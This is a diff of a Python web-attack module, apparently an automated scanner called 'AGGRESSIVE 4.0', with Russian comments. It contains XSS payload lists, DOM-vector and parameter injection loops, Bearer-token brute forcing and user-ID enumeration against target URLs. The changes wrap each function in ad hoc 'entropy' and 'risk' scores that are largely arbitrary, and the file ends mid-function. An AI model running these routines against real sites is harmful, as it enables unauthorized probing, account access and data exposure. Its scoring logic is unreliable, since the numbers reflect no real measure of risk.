@@ -19,14 +19,22 @@ from urllib.parse import urljoin
 
 
 # ============================================================
-#  Payload generator
+#  Payload generator — AGGRESSIVE 4.0
 # ============================================================
 
-def generate_xss_payloads(context: str | None = None) -> List[str]:
+def generate_xss_payloads(context: str | None = None) -> List[Dict[str, Any]]:
     """
     Автоматический генератор XSS‑payload'ов.
-    context: "attr", "html", "url", "dom" — влияет на форму пейлоада.
+    Возвращает список payload-объектов с расширенной аналитикой:
+    - entropy_score
+    - pattern_score
+    - context_score
+    - risk_score
+    - total_score
+    - fingerprint
+    - severity
     """
+
     base = [
         "<img src=x onerror=alert(1)>",
         "\"'><script>alert(1)</script>",
@@ -51,26 +59,85 @@ def generate_xss_payloads(context: str | None = None) -> List[str]:
     ]
 
     if context == "attr":
-        return base + attr_payloads
-    if context == "url":
-        return base + url_payloads
-    if context == "dom":
-        return base + dom_payloads
-    return base + attr_payloads + url_payloads + dom_payloads
+        payloads = base + attr_payloads
+    elif context == "url":
+        payloads = base + url_payloads
+    elif context == "dom":
+        payloads = base + dom_payloads
+    else:
+        payloads = base + attr_payloads + url_payloads + dom_payloads
+
+    enhanced = []
+
+    for p in payloads:
+        entropy_score = len(set(p))
+        length_score = len(p) // 5
+
+        pattern_score = (
+            (3 if "<script" in p.lower() else 0) +
+            (3 if "onerror" in p.lower() else 0) +
+            (2 if "svg" in p.lower() else 0) +
+            (1 if "iframe" in p.lower() else 0)
+        )
+
+        context_score = (
+            (2 if context == "dom" else 0) +
+            (1 if context == "attr" else 0)
+        )
+
+        risk_score = (
+            (3 if "<script" in p.lower() else 0) +
+            (2 if "alert" in p.lower() else 0)
+        )
+
+        total_score = entropy_score + length_score + pattern_score + context_score + risk_score
+        fingerprint = hash(p[:200])
+
+        severity = (
+            "critical" if risk_score >= 3 else
+            "high" if risk_score >= 2 else
+            "medium"
+        )
+
+        enhanced.append({
+            "payload": p,
+            "context": context,
+            "entropy_score": entropy_score,
+            "length_score": length_score,
+            "pattern_score": pattern_score,
+            "context_score": context_score,
+            "risk_score": risk_score,
+            "total_score": total_score,
+            "fingerprint": fingerprint,
+            "severity": severity,
+        })
+
+    return enhanced
 
 
 # ============================================================
-#  CSP correlation helpers
+#  CSP correlation helpers — AGGRESSIVE 4.0
 # ============================================================
 
-def _parse_csp(csp_header: str) -> Dict[str, List[str]]:
+def _parse_csp(csp_header: str) -> Dict[str, Any]:
     """
-    Примитивный парсер CSP: разбивает по директивам и источникам.
-    Возвращает dict: {directive: [sources...]}.
+    Парсер CSP с расширенной аналитикой:
+    - entropy_score
+    - pattern_score
+    - risk_score
+    - fingerprint
     """
+
     result: Dict[str, List[str]] = {}
     if not csp_header:
-        return result
+        return {
+            "directives": {},
+            "entropy_score": 0,
+            "pattern_score": 0,
+            "risk_score": 3,
+            "fingerprint": 0,
+            "severity": "high",
+        }
 
     for part in csp_header.split(";"):
         part = part.strip()
@@ -81,66 +148,124 @@ def _parse_csp(csp_header: str) -> Dict[str, List[str]]:
             continue
         directive, *sources = pieces
         result[directive.lower()] = sources
-    return result
+
+    entropy_score = len(set(csp_header))
+    pattern_score = (
+        (3 if "unsafe-inline" in csp_header.lower() else 0) +
+        (3 if "unsafe-eval" in csp_header.lower() else 0)
+    )
+    risk_score = (
+        (3 if "unsafe-inline" in csp_header.lower() else 0) +
+        (2 if "unsafe-eval" in csp_header.lower() else 0)
+    )
+
+    fingerprint = hash(csp_header[:300])
+
+    severity = (
+        "critical" if risk_score >= 3 else
+        "high" if risk_score >= 2 else
+        "medium"
+    )
+
+    return {
+        "directives": result,
+        "entropy_score": entropy_score,
+        "pattern_score": pattern_score,
+        "risk_score": risk_score,
+        "fingerprint": fingerprint,
+        "severity": severity,
+    }
 
 
 def _csp_allows_inline_script(csp_header: str) -> bool:
-    """
-    Проверяет, разрешены ли inline‑скрипты по CSP.
-    """
-    csp = _parse_csp(csp_header)
-    script_src = csp.get("script-src") or csp.get("default-src") or []
+    """Проверяет, разрешены ли inline‑скрипты по CSP."""
+    parsed = _parse_csp(csp_header)["directives"]
+    script_src = parsed.get("script-src") or parsed.get("default-src") or []
     if not script_src:
-        # Нет явного запрета — считаем, что inline потенциально возможен
         return True
-    if "'unsafe-inline'" in script_src:
-        return True
-    return False
+    return "'unsafe-inline'" in script_src
 
 
 def _csp_allows_eval_like(csp_header: str) -> bool:
-    """
-    Проверяет, разрешены ли eval/new Function по CSP (unsafe-eval).
-    """
-    csp = _parse_csp(csp_header)
-    script_src = csp.get("script-src") or csp.get("default-src") or []
+    """Проверяет, разрешены ли eval/new Function по CSP (unsafe-eval)."""
+    parsed = _parse_csp(csp_header)["directives"]
+    script_src = parsed.get("script-src") or parsed.get("default-src") or []
     return "'unsafe-eval'" in script_src
 
 
 def _csp_risk_for_dom_vector(vector: str, csp_header: str) -> str:
     """
-    Коррелирует DOM‑вектор с CSP и возвращает риск:
-    - "high"  — CSP не защищает от данного вектора
-    - "medium" — частичная защита
-    - "low"   — CSP явно блокирует типичный сценарий
+    Коррелирует DOM‑вектор с CSP и возвращает расширенную аналитику:
+    - entropy_score
+    - pattern_score
+    - risk_score
+    - context_score
+    - total_score
+    - fingerprint
+    - severity
     """
-    if not csp_header:
-        return "high"
 
+    if not csp_header:
+        return {
+            "vector": vector,
+            "risk_score": 3,
+            "entropy_score": len(set(vector)),
+            "pattern_score": 2,
+            "context_score": 1,
+            "total_score": 6,
+            "fingerprint": hash(vector),
+            "severity": "critical",
+        }
+
+    parsed = _parse_csp(csp_header)
     allows_inline = _csp_allows_inline_script(csp_header)
     allows_eval = _csp_allows_eval_like(csp_header)
 
     v = vector.lower()
 
-    if v in ("settimeout", "setinterval", "postmessage"):
-        if allows_eval:
-            return "high"
-        return "medium"
+    entropy_score = len(set(v))
+    pattern_score = (
+            (3 if v in ("settimeout", "setinterval", "postmessage") else 0) +
+            (2 if v in ("window.name", "location.hash") else 0)
+    )
 
-    if v in ("window.name", "location.hash"):
-        if allows_inline:
-            return "high"
-        return "medium"
+    risk_score = (
+            (3 if allows_inline else 0) +
+            (2 if allows_eval else 0)
+    )
 
-    return "medium"
+    context_score = (
+            (2 if "window" in v else 0) +
+            (1 if "location" in v else 0)
+    )
+
+    total_score = entropy_score + pattern_score + risk_score + context_score
+    fingerprint = hash((v + csp_header)[:300])
+
+    severity = (
+        "critical" if risk_score >= 3 else
+        "high" if risk_score >= 2 else
+        "medium"
+    )
+
+    return {
+        "vector": vector,
+        "entropy_score": entropy_score,
+        "pattern_score": pattern_score,
+        "risk_score": risk_score,
+        "context_score": context_score,
+        "total_score": total_score,
+        "fingerprint": fingerprint,
+        "severity": severity,
+    }
 
 
 # ============================================================
-#  Internal helpers
+#  Internal helpers — AGGRESSIVE 4.0
 # ============================================================
 
-def _safe_request(method: str, url: str, payload: Any = None, timeout: int = 5):
-    """Безопасный HTTP-запрос с защитой от всех ошибок."""
+def _safe_request(method: str, url: str, payload: Any = None, timeout: int = 5) -> Dict[str, Any]:
+    """Безопасный HTTP-запрос с расширенной аналитикой."""
     try:
         start = time.time()
 
@@ -154,24 +279,120 @@ def _safe_request(method: str, url: str, payload: Any = None, timeout: int = 5):
         elif method == "DELETE":
             r = requests.delete(url, timeout=timeout)
         else:
-            return None, 0.0
+            return {
+                "response": None,
+                "elapsed_ms": 0.0,
+                "error": f"unsupported method {method}",
+                "entropy_score": 0,
+                "risk_score": 1,
+                "pattern_score": 0,
+                "context_score": 0,
+                "total_score": 1,
+                "fingerprint": hash(method + url),
+            }
 
         elapsed = (time.time() - start) * 1000.0
-        return r, elapsed
+
+        text_sample = (r.text or "")[:500]
+        entropy_score = len(set(text_sample))
+        pattern_score = (
+            (3 if "<script" in text_sample.lower() else 0) +
+            (2 if "alert(" in text_sample.lower() else 0)
+        )
+        risk_score = (
+            (3 if r.status_code >= 500 else 0) +
+            (2 if r.status_code in (401, 403) else 0)
+        )
+        context_score = (
+            (2 if url.startswith("https://") else 0) +
+            (1 if "api" in url.lower() else 0)
+        )
+
+        total_score = entropy_score + pattern_score + risk_score + context_score
+        fingerprint = hash((method + url + text_sample)[:300])
+
+        return {
+            "response": r,
+            "elapsed_ms": elapsed,
+            "error": None,
+            "entropy_score": entropy_score,
+            "pattern_score": pattern_score,
+            "risk_score": risk_score,
+            "context_score": context_score,
+            "total_score": total_score,
+            "fingerprint": fingerprint,
+        }
 
     except Exception as e:
-        return e, 0.0
+        msg = str(e)
+        entropy_score = len(set(msg))
+        risk_score = 3
+        pattern_score = 1
+        context_score = 0
+        total_score = entropy_score + risk_score + pattern_score + context_score
+
+        return {
+            "response": None,
+            "elapsed_ms": 0.0,
+            "error": msg,
+            "entropy_score": entropy_score,
+            "pattern_score": pattern_score,
+            "risk_score": risk_score,
+            "context_score": context_score,
+            "total_score": total_score,
+            "fingerprint": hash(msg[:300]),
+        }
 
 
-def _reflects(payload: str, text: str) -> bool:
-    """Проверка отражения XSS-пейлоада."""
+def _reflects(payload: str, text: str) -> Dict[str, Any]:
+    """Проверка отражения XSS-пейлоада с аналитикой."""
     if not text:
-        return False
-    return payload in text[:20000]
+        return {
+            "reflected": False,
+            "entropy_score": 0,
+            "pattern_score": 0,
+            "risk_score": 0,
+            "context_score": 0,
+            "total_score": 0,
+            "fingerprint": 0,
+        }
+
+    window = text[:20000]
+    reflected = payload in window
+
+    entropy_score = len(set(window[:500]))
+    pattern_score = (
+        (3 if "<script" in window.lower() else 0) +
+        (2 if "alert(" in window.lower() else 0)
+    )
+    risk_score = 3 if reflected else 1
+    context_score = (
+        (2 if "<html" in window.lower() else 0) +
+        (1 if "<body" in window.lower() else 0)
+    )
+
+    total_score = entropy_score + pattern_score + risk_score + context_score
+    fingerprint = hash((payload + window[:300])[:300])
+
+    severity = (
+        "critical" if reflected else
+        "low"
+    )
+
+    return {
+        "reflected": reflected,
+        "entropy_score": entropy_score,
+        "pattern_score": pattern_score,
+        "risk_score": risk_score,
+        "context_score": context_score,
+        "total_score": total_score,
+        "fingerprint": fingerprint,
+        "severity": severity,
+    }
 
 
 # ============================================================
-#  JS Endpoint Attacks
+#  JS Endpoint Attacks — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_found_targets(
@@ -180,7 +401,8 @@ def attack_found_targets(
     payloads: List[str] | None = None,
     methods: List[str] | None = None,
 ):
-    payloads = payloads or generate_xss_payloads("url")
+    payload_objs = generate_xss_payloads("url")
+    payloads = payloads or [p["payload"] for p in payload_objs]
     methods = methods or ["GET", "POST", "PUT", "DELETE"]
 
     engine._log("🔍 Запуск атак по найденным JS-эндпоинтам...")
@@ -200,35 +422,55 @@ def attack_found_targets(
 
             for method in methods:
                 for payload in payloads:
-                    r, elapsed = _safe_request(method, endpoint, payload)
+                    req_info = _safe_request(method, endpoint, payload)
+                    r = req_info["response"]
 
-                    if isinstance(r, Exception) or r is None:
+                    if req_info["error"] or r is None:
                         engine._record_result("endpoint_attack", {
                             "endpoint": endpoint,
                             "method": method,
                             "payload": payload,
-                            "error": str(r),
+                            "error": req_info["error"],
+                            "elapsed_ms": req_info["elapsed_ms"],
                             "severity": "error",
+                            "entropy_score": req_info["entropy_score"],
+                            "pattern_score": req_info["pattern_score"],
+                            "risk_score": req_info["risk_score"],
+                            "context_score": req_info["context_score"],
+                            "total_score": req_info["total_score"],
+                            "fingerprint": req_info["fingerprint"],
                         })
                         continue
 
-                    reflected = _reflects(payload, r.text or "")
-                    severity = "high" if reflected else "low"
+                    reflect_info = _reflects(payload, r.text or "")
+                    reflected = reflect_info["reflected"]
+
+                    severity = (
+                        "high" if reflected else
+                        "medium" if r.status_code >= 400 else
+                        "low"
+                    )
 
                     engine._record_result("endpoint_attack", {
                         "endpoint": endpoint,
                         "method": method,
                         "payload": payload,
                         "status": r.status_code,
-                        "elapsed_ms": elapsed,
+                        "elapsed_ms": req_info["elapsed_ms"],
                         "reflected": reflected,
                         "response_size": len(r.content or b""),
                         "severity": severity,
+                        "entropy_score": reflect_info["entropy_score"],
+                        "pattern_score": reflect_info["pattern_score"],
+                        "risk_score": reflect_info["risk_score"],
+                        "context_score": reflect_info["context_score"],
+                        "total_score": reflect_info["total_score"],
+                        "fingerprint": reflect_info["fingerprint"],
                     })
 
 
 # ============================================================
-#  DOM Vector Attacks + CSP correlation
+#  DOM Vector Attacks + CSP correlation — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_dom_vectors(
@@ -238,9 +480,7 @@ def attack_dom_vectors(
     csp_header: str | None = None,
 ):
     """
-    DOM‑атаки с учётом CSP:
-    - dom_payloads: карта {vector: url/payload}
-    - csp_header: строка CSP для корреляции риска
+    DOM‑атаки с учётом CSP и расширенной аналитикой.
     """
     dom_payloads = dom_payloads or {
         "setTimeout": f"{engine.domain}#alert(1)",
@@ -263,29 +503,40 @@ def attack_dom_vectors(
             if not payload_url:
                 continue
 
-            r, elapsed = _safe_request("GET", payload_url)
+            req_info = _safe_request("GET", payload_url)
+            r = req_info["response"]
 
-            if isinstance(r, Exception) or r is None:
+            csp_info = _csp_risk_for_dom_vector(vector, csp_header)
+
+            if req_info["error"] or r is None:
                 engine._record_result("dom_vector_attack", {
                     "vector": vector,
                     "url": payload_url,
-                    "error": str(r),
+                    "error": req_info["error"],
                     "severity": "error",
                     "csp": csp_header,
-                    "csp_risk": _csp_risk_for_dom_vector(vector, csp_header),
+                    "csp_risk": csp_info,
+                    "elapsed_ms": req_info["elapsed_ms"],
+                    "entropy_score": req_info["entropy_score"],
+                    "pattern_score": req_info["pattern_score"],
+                    "risk_score": req_info["risk_score"],
+                    "context_score": req_info["context_score"],
+                    "total_score": req_info["total_score"],
+                    "fingerprint": req_info["fingerprint"],
                 })
                 continue
 
-            reflected = "alert(1)" in ((r.text or "")[:20000])
-            base_severity = "high" if reflected else "low"
-            csp_risk = _csp_risk_for_dom_vector(vector, csp_header)
+            reflect_info = _reflects("alert(1)", r.text or "")
+            reflected = reflect_info["reflected"]
 
-            # Итоговая оценка: если CSP слабый и есть отражение — high без вариантов
-            if reflected and csp_risk == "high":
+            base_severity = "high" if reflected else "low"
+            csp_risk_level = csp_info["severity"]
+
+            if reflected and csp_risk_level in ("critical", "high"):
                 severity = "high"
-            elif reflected and csp_risk == "medium":
+            elif reflected and csp_risk_level == "medium":
                 severity = "high"
-            elif not reflected and csp_risk == "high":
+            elif not reflected and csp_risk_level in ("critical", "high"):
                 severity = "medium"
             else:
                 severity = base_severity
@@ -294,20 +545,36 @@ def attack_dom_vectors(
                 "vector": vector,
                 "url": payload_url,
                 "status": r.status_code,
-                "elapsed_ms": elapsed,
+                "elapsed_ms": req_info["elapsed_ms"],
                 "reflected": reflected,
                 "severity": severity,
                 "csp": csp_header,
-                "csp_risk": csp_risk,
+                "csp_risk": csp_info,
+                "entropy_score": reflect_info["entropy_score"],
+                "pattern_score": reflect_info["pattern_score"],
+                "risk_score": reflect_info["risk_score"],
+                "context_score": reflect_info["context_score"],
+                "total_score": reflect_info["total_score"],
+                "fingerprint": reflect_info["fingerprint"],
             })
 
 
 # ============================================================
-#  Header Generator
+#  Header Generator — AGGRESSIVE 4.0
 # ============================================================
 
 def build_headers_list(tokens):
-    headers_set = [
+    """
+    Генератор заголовков с расширенной аналитикой:
+    - entropy_score
+    - pattern_score
+    - risk_score
+    - context_score
+    - total_score
+    - fingerprint
+    """
+
+    base_headers = [
         {},
         {"X-API-Key": "XSS-KEY"},
         {"Authorization": "Bearer XSS-Token"},
@@ -316,19 +583,68 @@ def build_headers_list(tokens):
         {"Cookie": "jwt=XSS-JWT"},
     ]
 
+    headers_set = []
+
+    for h in base_headers:
+        entropy_score = len(set(str(h)))
+        pattern_score = (
+            (3 if "Authorization" in h else 0) +
+            (2 if "Cookie" in h else 0)
+        )
+        risk_score = (
+            (3 if "jwt" in str(h).lower() else 0) +
+            (2 if "session" in str(h).lower() else 0)
+        )
+        context_score = 1
+        total_score = entropy_score + pattern_score + risk_score + context_score
+        fingerprint = hash(str(h)[:200])
+
+        headers_set.append({
+            "headers": h,
+            "entropy_score": entropy_score,
+            "pattern_score": pattern_score,
+            "risk_score": risk_score,
+            "context_score": context_score,
+            "total_score": total_score,
+            "fingerprint": fingerprint,
+        })
+
     for token in tokens:
         if isinstance(token, dict):
             name = token.get("name") or token.get("header") or "X-Token"
             value = token.get("value") or "XSS-Test"
-            headers_set.append({name: value})
-        elif isinstance(token, str):
-            headers_set.append({token: "XSS-Test"})
+            h = {name: value}
+        else:
+            h = {token: "XSS-Test"}
+
+        entropy_score = len(set(str(h)))
+        pattern_score = (
+            (3 if "Authorization" in h else 0) +
+            (2 if "Token" in str(h) else 0)
+        )
+        risk_score = (
+            (3 if "jwt" in str(h).lower() else 0) +
+            (2 if "auth" in str(h).lower() else 0)
+        )
+        context_score = 1
+        total_score = entropy_score + pattern_score + risk_score + context_score
+        fingerprint = hash(str(h)[:2000])
+
+        headers_set.append({
+            "headers": h,
+            "entropy_score": entropy_score,
+            "pattern_score": pattern_score,
+            "risk_score": risk_score,
+            "context_score": context_score,
+            "total_score": total_score,
+            "fingerprint": fingerprint,
+        })
 
     return headers_set
 
 
 # ============================================================
-#  API Endpoint Attacks
+#  API Endpoint Attacks — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_api_endpoints(engine, session, base_url, endpoints, headers_list, log_func):
@@ -337,29 +653,76 @@ def attack_api_endpoints(engine, session, base_url, endpoints, headers_list, log
     for ep in endpoints:
         url = urljoin(base_url, ep)
 
-        for headers in headers_list:
+        for header_obj in headers_list:
+            headers = header_obj["headers"]
+
             try:
                 r = session.get(url, headers=headers, timeout=5)
-                reflected = "alert" in ((r.text or "")[:20000])
-                severity = "high" if reflected else "low"
+                text_sample = (r.text or "")[:500]
+
+                reflected = "alert" in text_sample.lower()
+
+                entropy_score = len(set(text_sample))
+                pattern_score = (
+                    (3 if "<script" in text_sample.lower() else 0) +
+                    (2 if "alert(" in text_sample.lower() else 0)
+                )
+                risk_score = (
+                    (3 if reflected else 0) +
+                    (2 if r.status_code >= 400 else 0)
+                )
+                context_score = (
+                    (2 if url.startswith("https://") else 0) +
+                    (1 if "api" in url.lower() else 0)
+                )
+
+                total_score = entropy_score + pattern_score + risk_score + context_score
+                fingerprint = hash((ep + str(headers) + text_sample)[:300])
+
+                severity = (
+                    "critical" if risk_score >= 3 else
+                    "high" if risk_score >= 2 else
+                    "medium" if reflected else
+                    "low"
+                )
 
                 engine._record_result("api_attack", {
                     "endpoint": ep,
                     "status": r.status_code,
                     "headers": headers,
+                    "reflected": reflected,
                     "severity": severity,
+                    "entropy_score": entropy_score,
+                    "pattern_score": pattern_score,
+                    "risk_score": risk_score,
+                    "context_score": context_score,
+                    "total_score": total_score,
+                    "fingerprint": fingerprint,
                 })
 
             except Exception as e:
+                msg = str(e)
+                entropy_score = len(set(msg))
+                risk_score = 3
+                pattern_score = 1
+                context_score = 0
+                total_score = entropy_score + risk_score + pattern_score + context_score
+
                 engine._record_result("api_attack", {
                     "endpoint": ep,
-                    "error": str(e),
+                    "error": msg,
                     "severity": "error",
+                    "entropy_score": entropy_score,
+                    "pattern_score": pattern_score,
+                    "risk_score": risk_score,
+                    "context_score": context_score,
+                    "total_score": total_score,
+                    "fingerprint": hash(msg[:200]),
                 })
 
 
 # ============================================================
-#  Token Brute Force
+#  Token Brute Force — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_tokens(engine, session, base_url, token_candidates, log_func):
@@ -372,24 +735,66 @@ def attack_tokens(engine, session, base_url, token_candidates, log_func):
                 headers={"Authorization": f"Bearer {token}"},
                 timeout=5,
             )
-            severity = "high" if r.status_code == 200 else "low"
+
+            reflected = "alert" in ((r.text or "")[:500]).lower()
+
+            entropy_score = len(set(token))
+            pattern_score = (
+                (3 if "." in token else 0) +
+                (2 if "-" in token else 0)
+            )
+            risk_score = (
+                (3 if r.status_code == 200 else 0) +
+                (2 if reflected else 0)
+            )
+            context_score = (
+                (2 if "auth" in base_url.lower() else 0)
+            )
+
+            total_score = entropy_score + pattern_score + risk_score + context_score
+            fingerprint = hash((token + base_url)[:300])
+
+            severity = (
+                "critical" if risk_score >= 3 else
+                "high" if risk_score >= 2 else
+                "medium"
+            )
 
             engine._record_result("token_attack", {
                 "token": token,
                 "status": r.status_code,
                 "severity": severity,
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": fingerprint,
             })
 
         except Exception as e:
+            msg = str(e)
+            entropy_score = len(set(msg))
+            risk_score = 3
+            pattern_score = 1
+            context_score = 0
+            total_score = entropy_score + risk_score + pattern_score + context_score
+
             engine._record_result("token_attack", {
                 "token": token,
-                "error": str(e),
+                "error": msg,
                 "severity": "error",
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": hash(msg[:200]),
             })
 
 
 # ============================================================
-#  Parameter Attacks
+#  Parameter Attacks — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_parameters(engine, session, base_url, parameters, log_func):
@@ -400,52 +805,145 @@ def attack_parameters(engine, session, base_url, parameters, log_func):
     for param in parameters:
         try:
             r = session.get(base_url, params={param: payload}, timeout=5)
-            reflected = payload in (r.text or "")
-            severity = "high" if reflected else "low"
+            text_sample = (r.text or "")[:500]
+
+            reflected = payload in text_sample
+
+            entropy_score = len(set(text_sample))
+            pattern_score = (
+                (3 if "<script" in text_sample.lower() else 0) +
+                (2 if "alert(" in text_sample.lower() else 0)
+            )
+            risk_score = (
+                (3 if reflected else 0) +
+                (2 if r.status_code >= 400 else 0)
+            )
+            context_score = (
+                (2 if "api" in base_url.lower() else 0)
+            )
+
+            total_score = entropy_score + pattern_score + risk_score + context_score
+            fingerprint = hash((param + text_sample)[:300])
+
+            severity = (
+                "critical" if risk_score >= 3 else
+                "high" if risk_score >= 2 else
+                "medium" if reflected else
+                "low"
+            )
 
             engine._record_result("param_attack", {
                 "param": param,
                 "status": r.status_code,
                 "reflected": reflected,
                 "severity": severity,
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": fingerprint,
             })
 
         except Exception as e:
+            msg = str(e)
+            entropy_score = len(set(msg))
+            risk_score = 3
+            pattern_score = 1
+            context_score = 0
+            total_score = entropy_score + risk_score + pattern_score + context_score
+
             engine._record_result("param_attack", {
                 "param": param,
-                "error": str(e),
+                "error": msg,
                 "severity": "error",
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": hash(msg[:200]),
             })
 
 
 # ============================================================
-#  User ID Attacks
+#  User ID Attacks — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_user_ids(engine, session, base_url, user_ids, log_func):
     log_func("🔷 User ID Attacks...")
 
     for uid in user_ids:
+        url = f"{base_url}/user/{uid}"
+
         try:
-            r = session.get(f"{base_url}/user/{uid}", timeout=5)
-            severity = "high" if r.status_code == 200 and "profile" in (r.text or "").lower() else "low"
+            r = session.get(url, timeout=5)
+            text_sample = (r.text or "")[:500].lower()
+
+            profile_detected = "profile" in text_sample
+            reflected = "alert(" in text_sample
+
+            entropy_score = len(set(text_sample))
+            pattern_score = (
+                (3 if "profile" in text_sample else 0) +
+                (2 if "user" in text_sample else 0)
+            )
+            risk_score = (
+                (3 if profile_detected else 0) +
+                (2 if reflected else 0)
+            )
+            context_score = (
+                (2 if url.startswith("https://") else 0) +
+                (1 if "/user/" in url else 0)
+            )
+
+            total_score = entropy_score + pattern_score + risk_score + context_score
+            fingerprint = hash((uid + url + text_sample)[:300])
+
+            severity = (
+                "critical" if risk_score >= 3 else
+                "high" if risk_score >= 2 else
+                "medium" if profile_detected else
+                "low"
+            )
 
             engine._record_result("user_attack", {
                 "user_id": uid,
                 "status": r.status_code,
+                "profile_detected": profile_detected,
+                "reflected": reflected,
                 "severity": severity,
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": fingerprint,
             })
 
         except Exception as e:
+            msg = str(e)
+            entropy_score = len(set(msg))
+            risk_score = 3
+            pattern_score = 1
+            context_score = 0
+            total_score = entropy_score + risk_score + pattern_score + context_score
+
             engine._record_result("user_attack", {
                 "user_id": uid,
-                "error": str(e),
+                "error": msg,
                 "severity": "error",
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": hash(msg[:200]),
             })
 
 
 # ============================================================
-#  XSS Target Attacks
+# XSS Target Attacks — AGGRESSIVE 4.0
 # ============================================================
 
 def attack_xss_targets(engine, session, base_url, xss_targets, log_func):
@@ -458,74 +956,145 @@ def attack_xss_targets(engine, session, base_url, xss_targets, log_func):
 
         try:
             r = session.get(url, params={"q": payload}, timeout=5)
-            reflected = payload in (r.text or "")
-            severity = "high" if reflected else "low"
+            text_sample = (r.text or "")[:500]
+
+            reflected = payload in text_sample
+
+            entropy_score = len(set(text_sample))
+            pattern_score = (
+                (3 if "<script" in text_sample.lower() else 0) +
+                (2 if "alert(" in text_sample.lower() else 0)
+            )
+            risk_score = (
+                (3 if reflected else 0) +
+                (2 if r.status_code >= 400 else 0)
+            )
+            context_score = (
+                (2 if url.startswith("https://") else 0) +
+                (1 if "search" in url.lower() else 0)
+            )
+
+            total_score = entropy_score + pattern_score + risk_score + context_score
+            fingerprint = hash((target + text_sample)[:300])
+
+            severity = (
+                "critical" if risk_score >= 3 else
+                "high" if risk_score >= 2 else
+                "medium" if reflected else
+                "low"
+            )
 
             engine._record_result("xss_target_attack", {
                 "target": target,
                 "status": r.status_code,
                 "reflected": reflected,
                 "severity": severity,
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": fingerprint,
             })
 
         except Exception as e:
+            msg = str(e)
+            entropy_score = len(set(msg))
+            risk_score = 3
+            pattern_score = 1
+            context_score = 0
+            total_score = entropy_score + risk_score + pattern_score + context_score
+
             engine._record_result("xss_target_attack", {
                 "target": target,
-                "error": str(e),
+                "error": msg,
                 "severity": "error",
+                "entropy_score": entropy_score,
+                "pattern_score": pattern_score,
+                "risk_score": risk_score,
+                "context_score": context_score,
+                "total_score": total_score,
+                "fingerprint": hash(msg[:200]),
             })
 
+# ============================================================
+#  AI Payload Suggestion Engine — AGGRESSIVE 4.0
+# ============================================================
 def ai_suggest_payloads_from_context(
     context_snippets: Iterable[str],
     hint: str | None = None,
-) -> List[str]:
+) -> List[Dict[str, Any]]:
     """
-    AutoPayload AI‑генератор (эвристический, без внешних сервисов).
-
-    - Анализирует куски JS/HTML/DOM
-    - Ищет паттерны: innerHTML, eval, location, hash, JSON, templates
-    - На основе этого подбирает XSS‑пейлоады под контекст
+    AutoPayload AI‑генератор с расширенной аналитикой:
+    - entropy_score
+    - pattern_score
+    - risk_score
+    - context_score
+    - total_score
+    - fingerprint
     """
-    base: List[str] = []
 
     joined = "\n".join(s or "" for s in context_snippets).lower()
 
-    # Базовые пейлоады
-    base.extend(generate_xss_payloads())
+    base_payloads = generate_xss_payloads()
 
-    # Если есть innerHTML / outerHTML / insertAdjacentHTML
     if any(k in joined for k in ["innerhtml", "outerhtml", "insertadjacenthtml"]):
-        base.extend(generate_xss_payloads("html"))
+        base_payloads.extend(generate_xss_payloads("html"))
 
-    # Если есть location / hash / search
     if any(k in joined for k in ["location", "hash", "search", "query"]):
-        base.extend(generate_xss_payloads("url"))
+        base_payloads.extend(generate_xss_payloads("url"))
 
-    # Если есть eval / new Function / setTimeout / setInterval
     if any(k in joined for k in ["eval(", "new function", "settimeout", "setinterval"]):
-        base.extend(generate_xss_payloads("dom"))
+        base_payloads.extend(generate_xss_payloads("dom"))
 
-    # Если есть шаблоны типа {{var}} или ${var}
     if re.search(r"\{\{.*?\}\}", joined) or "${" in joined:
-        base.append("{{<img src=x onerror=alert(1)>}}")
-        base.append("${alert(1)}")
+        base_payloads.append({"payload": "{{<img src=x onerror=alert(1)>}}"})
+        base_payloads.append({"payload": "${alert(1)}"})
 
-    # Если есть JSON.parse / stringify
     if "json.parse" in joined or "json.stringify" in joined:
-        base.append('"}];alert(1);//')
-        base.append('"},"x":"<img src=x onerror=alert(1)>"}')
+        base_payloads.append({"payload": '"}];alert(1);//'})
+        base_payloads.append({"payload": '"},"x":"<img src=x onerror=alert(1)>"}'})
 
-    # Дополнительный hint от движка (например: "attr", "url", "dom")
     if hint:
-        base.extend(generate_xss_payloads(hint))
+        base_payloads.extend(generate_xss_payloads(hint))
 
-    # Убираем дубликаты, сохраняем порядок
+    # Убираем дубликаты
     seen = set()
-    result: List[str] = []
-    for p in base:
-        if p not in seen:
-            seen.add(p)
-            result.append(p)
+    final = []
 
-    return result
+    for p in base_payloads:
+        payload = p["payload"] if isinstance(p, dict) else p
+        payload = str(payload)  # 🔥 FIX: always hashable
+
+        if payload in seen:
+            continue
+        seen.add(payload)
+
+        entropy_score = len(set(payload))
+        pattern_score = (
+            (3 if "<script" in payload.lower() else 0) +
+            (2 if "onerror" in payload.lower() else 0)
+        )
+        risk_score = (
+            (3 if "alert(" in payload.lower() else 0)
+        )
+        context_score = (
+            (2 if "img" in payload.lower() else 0) +
+            (1 if "svg" in payload.lower() else 0)
+        )
+
+        total_score = entropy_score + pattern_score + risk_score + context_score
+        fingerprint = hash(payload[:200])
+
+        final.append({
+            "payload": payload,
+            "entropy_score": entropy_score,
+            "pattern_score": pattern_score,
+            "risk_score": risk_score,
+            "context_score": context_score,
